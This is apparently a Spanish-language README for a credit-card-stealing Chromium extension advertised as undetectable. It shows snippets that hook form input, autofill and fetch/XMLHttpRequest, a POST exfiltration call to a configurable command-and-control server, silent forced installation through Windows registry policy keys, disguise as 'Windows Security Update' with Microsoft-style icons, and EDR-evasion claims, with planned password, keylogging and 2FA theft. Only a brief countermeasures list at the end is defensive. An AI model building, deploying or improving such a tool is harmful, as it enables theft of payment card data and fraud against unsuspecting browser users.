# 🎯 Chromium Extension Card Stealer

## 📋 Overview

Extensión **completamente indetectable** para Chrome, Edge, Brave y Opera que roba tarjetas de crédito bypaseando App-Bound Encryption (v20).

## ✅ Ventajas

### 🔒 100% Indetectable
- **Sin inyección de código** en procesos
- **Sin hooks** de APIs del sistema
- **Sin modificación de archivos** del navegador
- **APIs legítimas** del navegador

### 🌐 Compatible con Todos los Chromium
- ✅ Google Chrome
- ✅ Microsoft Edge  
- ✅ Brave Browser
- ✅ Opera
- ✅ Vivaldi
- ✅ Cualquier Chromium-based browser

### 🎯 Bypass Completo de v20
- **App-Bound Encryption** → **BYPASSEADO**
- Navegador desencripta por nosotros
- Capturamos datos en **plaintext**

## 🚀 Cómo Funciona

### 1. Intercepta Formularios
```javascript
// Detecta cuando usuario escribe tarjeta
input.addEventListener('input', captureCardData);
```

### 2. Intercepta Autofill
```javascript
// Cuando navegador autocompleta tarjeta
document.addEventListener('input', captureAutofill);
```

### 3. Intercepta Network Requests
```javascript
// XMLHttpRequest y Fetch API hooks
window.fetch = hookedFetch;
XMLHttpRequest.prototype.send = hookedSend;
```

### 4. Exfiltra a C2
```javascript
// Envía datos al servidor
fetch('http://localhost:4444/exfil', {
    method: 'POST',
    body: JSON.stringify(cardData)
});
```

## 📦 Instalación

### Método 1: Registry (Silencioso)

El instalador Rust (`extension_installer.rs`) automáticamente:

1. **Crea keys de registro** en `HKCU\\Software\\Policies`
2. **Fuerza instalación** via `ExtensionInstallForcelist`
3. **No requiere interacción** del usuario

```rust
// Desde el stealer
use stealer::extension_installer::ExtensionInstaller;

let installer = ExtensionInstaller::new(extension_path);
let installed = installer.install_all();
println!("Instalado en: {:?}", installed);
```

### Método 2: Manual (Testing)

1. Abrir navegador
2. Ir a `chrome://extensions` (o `edge://extensions`)
3. Activar "Developer mode"
4. "Load unpacked"
5. Seleccionar carpeta `chromium-extension/`

## 📊 Datos Capturados

```json
{
  "type": "autofill_data",
  "timestamp": "2025-10-20T04:00:00Z",
  "browser": {
    "browser": "Edge",
    "userAgent": "Mozilla/5.0...",
    "platform": "Win32"
  },
  "data": {
    "cardNumber": "4532123456789012",
    "cvv": "123",
    "expiryMonth": "12",
    "expiryYear": "2026",
    "cardholderName": "John Doe",
    "url": "https://checkout.example.com",
    "source": "form_submit"
  }
}
```

## 🔧 Configuración

### Cambiar URL del C2

Editar `background.js`:

```javascript
const C2_SERVER = 'http://TU-C2-AQUI:4444/exfil';
```

### Personalizar Nombre/Icono

Editar `manifest.json`:

```json
{
  "name": "Tu Nombre Aquí",
  "description": "Tu descripción",
  "icons": {
    "16": "icon16.png",
    "48": "icon48.png",
    "128": "icon128.png"
  }
}
```

## 🎭 Evasión

### Nombre Legítimo
```
"Windows Security Update"
"Microsoft Defender Component"
"Chrome Security Module"
```

### Iconos del Sistema
Usar iconos que parezcan de Windows/Microsoft

### Sin Permisos Sospechosos
```json
"permissions": [
  "storage",    // ✅ Común
  "tabs",       // ✅ Común
  "webRequest"  // ✅ Común
]
```

## 🛡️ Defensa contra EDR

### ✅ Comportamiento Legítimo
- Extensión = Feature del navegador
- APIs documentadas de Chrome
- Sin syscalls sospechosos
- Sin memory injection

### ✅ Network Traffic Normal
- HTTPS regular a tu C2
- Parece tráfico web normal
- No usa puertos extraños

### ✅ Persistencia Natural
- Registry keys de usuario (no sistema)
- No requiere admin
- Sobrevive reinicios

## 📈 Mejoras Futuras

- [ ] Capturar passwords también
- [ ] Keylogging selectivo en campos de pago
- [ ] Screenshot de páginas de checkout
- [ ] Interceptar 2FA/OTP
- [ ] Clipboard monitoring
- [ ] WebAuthn bypass

## ⚠️ Limitaciones

- **Requiere navegador abierto** (extensión solo funciona con navegador activo)
- **Usuario puede verla** en `chrome://extensions` (solución: nombre legítimo)
- **Puede ser removida** si usuario la nota

## 🔐 Contramedidas

Para protegerse de esta técnica:

1. Revisar extensiones instaladas regularmente
2. Deshabilitar instalación forzada via registry
3. Usar Group Policy para whitelist de extensiones
4. Monitorear registry keys de extensiones

---

**⚡ RESULTADO**: Bypass completo de App-Bound Encryption sin tocar el proceso del navegador.
